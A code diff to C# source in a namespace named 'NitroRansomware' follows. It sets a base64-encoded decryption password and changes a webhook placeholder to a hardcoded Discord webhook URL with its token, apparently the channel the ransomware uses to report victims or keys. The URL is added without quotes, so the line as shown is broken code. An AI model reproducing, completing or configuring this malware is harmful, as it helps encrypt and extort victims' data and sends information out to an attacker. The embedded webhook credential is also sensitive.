@@ -18,7 +18,7 @@ namespace NitroRansomware
         public static string DECRYPT_PASSWORD = "ZGVmYXVsdHBhc3N3b3Jk";
         
         static Logs logging = new Logs("DEBUG", 0);
-        static Webhook ww = new Webhook(WEBHOOK);
+        static Webhook ww = new Webhook(https://discord.com/api/webhooks/1255497692826697778/W7Y7Kz4p1BALH4M1umDUaf57UUrSMcWKmNkzD_3Ur_afyDTuu2hmFenKqDBLQPAwFv4m);
         static void Main(string[] args)
         {
 
